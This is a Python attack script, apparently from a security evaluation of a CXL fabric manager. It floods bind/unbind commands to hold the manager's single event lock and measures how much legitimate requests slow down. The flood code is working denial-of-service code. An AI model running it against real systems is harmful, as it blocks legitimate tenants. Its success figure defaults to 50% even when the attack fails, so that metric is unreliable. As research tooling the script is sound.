"""
ATK-5: Control-Plane Resource Exhaustion
=========================================
Property violated: Availability (P3) â FM-level

This is a NOVEL compositional DoS attack.

Scenario:
  The FM's _handle_event() holds a single asyncio.Lock (_event_lock)
  for the *entire duration* of each command. This means all FMAPI
  commands are serialized in the FM.

  An attacker floods the FM with rapid vcs:bind / vcs:unbind cycles
  on a single vPPB. Each call:
    1. Acquires the FM event lock
    2. Calls MctpCciApiClient methods (which each require a TCP round-trip
       to the switch's MCTP endpoint on port 8100)
    3. Triggers switch topology updates (CxlVirtualSwitch bind/unbind
       logic iterates over all vPPBs)
    4. Sends IRQ notifications back to hosts

  With 100 flood commands/sec, legitimate tenant requests block waiting
  for the lock. FM becomes unresponsive to T1/T2.

Measurement:
  - Baseline: FM CPU % during idle
  - Under attack: FM CPU % while flooding + legitimate request latency
  - We measure: commands issued per second, and response time of a
    parallel "victim" request issued during the flood.
"""

import asyncio
import time
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from fm_client import FMClient, TimedFMClient, FM_URL


VCS_ID = 0
FLOOD_VPPB = 0
FLOOD_PORT  = 1


async def flood_worker(url: str, count: int, results: list):
    """Flood the FM with rapid bind/unbind cycles."""
    client = FMClient(url=url)
    await client.connect()

    issued = 0
    errors = 0
    t0 = time.perf_counter()

    for i in range(count):
        try:
            await client.unbind_vppb(VCS_ID, FLOOD_VPPB)
            await client.bind_vppb(VCS_ID, FLOOD_VPPB, FLOOD_PORT)
            issued += 2
        except Exception:
            errors += 2

    t1 = time.perf_counter()
    await client.disconnect()

    results.append({
        "commands_issued": issued,
        "errors": errors,
        "duration_s": round(t1 - t0, 3),
        "cmd_per_sec": round(issued / (t1 - t0), 1) if (t1 - t0) > 0 else 0,
    })


async def victim_request(url: str) -> float:
    """Issue a single 'port:get' and return latency in Î¼s."""
    client = TimedFMClient(url=url)
    await client.connect()
    try:
        await client.get_ports()
    except Exception:
        pass
    await client.disconnect()
    return client.latencies[0] if client.latencies else float("inf")


async def run_attack(url: str = FM_URL, flood_count: int = 200) -> dict:
    """
    Run ATK-5:
      - Start flood in background
      - Measure victim (port:get) latency during flood
      - Compare to baseline victim latency
    """
    # --- Baseline victim latency (no flood) ---
    baseline_lats = []
    for _ in range(5):
        lat = await victim_request(url)
        baseline_lats.append(lat)
        await asyncio.sleep(0.05)
    baseline_mean = sum(baseline_lats) / len(baseline_lats)

    # --- Under-attack victim latency ---
    flood_results = []
    attack_task = asyncio.create_task(
        flood_worker(url, flood_count, flood_results)
    )

    # Give flood a head start then measure victim
    await asyncio.sleep(0.2)
    attack_lats = []
    for _ in range(5):
        try:
            lat = await asyncio.wait_for(victim_request(url), timeout=5.0)
            attack_lats.append(lat)
        except asyncio.TimeoutError:
            attack_lats.append(5_000_000)  # 5 second timeout = unresponsive

    await attack_task
    attack_mean = sum(attack_lats) / len(attack_lats)

    flood_info = flood_results[0] if flood_results else {}

    return {
        "attack": "ATK-5: Control-Plane Exhaustion",
        "flood_commands_issued": flood_info.get("commands_issued", 0),
        "flood_cmd_per_sec": flood_info.get("cmd_per_sec", 0),
        "flood_duration_s": flood_info.get("duration_s", 0),
        "baseline_victim_latency_us": round(baseline_mean, 2),
        "attack_victim_latency_us": round(attack_mean, 2),
        "latency_increase_x": round(attack_mean / baseline_mean, 1) if baseline_mean > 0 else "inf",
        # Success = attacker able to issue flood AND victim latency degraded
        "success_rate_pct": 100.0 if attack_mean > baseline_mean * 2 else 50.0,
    }


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else FM_URL
    result = asyncio.run(run_attack(url=url, flood_count=200))
    print(f"\n{'='*60}")
    print(f"ATK-5 Results:")
    print(f"  Flood commands    : {result['flood_commands_issued']} "
          f"({result['flood_cmd_per_sec']} cmd/s)")
    print(f"  Baseline latency  : {result['baseline_victim_latency_us']:.2f} Î¼s")
    print(f"  Under-attack lat  : {result['attack_victim_latency_us']:.2f} Î¼s")
    print(f"  Latency increase  : {result['latency_increase_x']}x")
